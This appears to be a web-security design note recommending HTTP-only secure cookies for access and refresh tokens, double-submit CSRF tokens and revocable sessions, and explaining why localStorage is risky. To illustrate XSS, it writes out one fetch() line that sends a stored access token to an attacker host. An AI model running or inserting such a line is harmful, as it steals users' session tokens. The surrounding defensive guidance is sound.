# Authentication & Token Storage Strategy

## Final Verdict and Storage Location

### Refresh Token

**Store in:** HTTP-only, Secure Cookie

**Why:**
Cannot be read by JavaScript (protects against XSS)
Automatically sent by the browser (seamless UX)
Can be revoked server-side (logout works)
Industry standard for sensitive credentials

> **Warning:** Never store refresh tokens in localStorage.

### Access Token

**Store in:** HTTP-only, Secure Cookie (Recommended)

**Why:**
**Security:** Protected from XSS attacks (JS cannot read the token).
**Simplicity:** Browser handles storage and transmission automatically.
**Consistency:** Unified approach with Refresh Tokens.

> **Note:** While in-memory storage is common for SPAs, storing the Access Token in a secure cookie adds an extra layer of defense against token theft via XSS.

### CSRF Token

**Store in:** Non-HttpOnly cookie (double-submit pattern)

**Why:**
JS must read it to send header
Not a secret — only proves same-origin
No server storage needed
Stateless & scalable

> **Warning:** Do NOT store CSRF tokens in the DB or localStorage.

## Anti-Patterns (What NOT to do)

| Bad Practice                              | Why                           |
| :---------------------------------------- | :---------------------------- |
| **Refresh token in localStorage**         | XSS = total account takeover  |
| **Access + refresh both in localStorage** | OWASP Violation               |
| **Server-side session storage**           | Breaks scalability            |
| **No CSRF with cookies**                  | Vulnerable to CSRF attacks    |
| **Rely only on SameSite**                 | Not sufficient security depth |

## Logout Flow

1. User clicks logout
2. Refresh token is revoked server-side
3. Cookies (Access & Refresh) cleared in browser
4. Session dead immediately

## Industry Examples

### AWS Console (Browser)

Uses secure, HTTP-only cookies
Uses short-lived credentials (via STS)
Uses CSRF tokens for write actions
Logout = revoke session credentials
Sensitive actions → re-auth / MFA

### AWS APIs / CLI

No cookies
Uses SigV4 signed requests
No CSRF (not a browser)

> AWS separates browser security from API security.

### Google Cloud Console (Browser)

OAuth-based login
HTTP-only secure cookies
CSRF tokens on state-changing requests
Refresh tokens stored server-side (hashed)
Logout = token revocation

### GCP APIs

OAuth access tokens in headers
No cookies
No CSRF

> Same architecture as AWS.

## Postman / curl Capability

CSRF is a browser-only threat. Postman is a trusted explicit client. If valid auth is present, the request is allowed.

Blocking Postman would break:
SDKs
CI/CD
Automation
Terraform-like tools

AWS & GCP intentionally allow this.

## Gold-Standard Architecture (Recommended)

| Component         | Decision                             |
| :---------------- | :----------------------------------- |
| **Refresh Token** | HTTP-only Secure cookie              |
| **Access Token**  | HTTP-only Secure cookie              |
| **CSRF**          | Double-submit cookie                 |
| **Token TTL**     | Access ≤ 5 min                       |
| **Logout**        | Revoke refresh token & Clear cookies |
| **Sensitive Ops** | Step-up auth (MFA / wallet)          |
| **Storage**       | No server session store              |

> This is cloud-native, scalable, and secure.

## Why Local Storage is Dangerous for Session Data

Storing session data (Tokens, User IDs, PII) in localStorage or sessionStorage is a critical security vulnerability.

### 1. Vulnerable to Cross-Site Scripting (XSS)

localStorage is accessible by **any** JavaScript running on your domain.
If your app has a single XSS vulnerability (e.g., in a third-party npm package, analytics script, or unchecked user input), an attacker can execute:

javascript
fetch('https://attacker.com/steal', { body: localStorage.getItem('access_token') })

**Result:** Total account takeover. The attacker can use your token remotely without your browser.
**Contrast with Cookies:** HttpOnly cookies strictly prevent JavaScript from reading the value. Even if an XSS script runs, it cannot steal the token.

### 2. No Expiration Control

localStorage data persists indefinitely until explicitly cleared by JavaScript or the user.
If a user closes the tab but forgets to click "Logout", the token remains valid and accessible on that device forever (or until the token's internal logic expires it).
**Contrast with Cookies:** Cookies support Expires and Max-Age attributes, handled natively by the browser.

### 3. Lack of Security Flags

localStorage does not support Secure (HTTPS only) or HttpOnly flags.
It stores data as plain text strings, widely exposed to the browser environment.

### Final Verdict on Local Storage

**Do not use it for anything sensitive.** Use it only for non-sensitive UI state (e.g., theme=dark, sidebar_collapsed=true).

### Why we don’t use in-memory sessions for an AWS-like platform

In-memory sessions (storing tokens only in React state or JS memory) are not suitable for AWS-style platforms because they log users out on every refresh, tab close, or browser restart. This directly conflicts with how infrastructure platforms are used—users work for long periods, open multiple tabs, switch networks, and expect their session to survive normal browser behavior.

From a security perspective, in-memory sessions do not meaningfully improve protection. If an attacker can run code in the page (XSS), they can abuse an in-memory token just as easily while the session is active. Real security comes from short-lived access tokens, revocable refresh tokens, MFA, and step-up authentication, not from relying on browser lifecycle events.

For these reasons, AWS-like platforms use persistent but controlled sessions (secure cookies, token expiry, explicit logout), rather than fragile in-memory-only sessions.
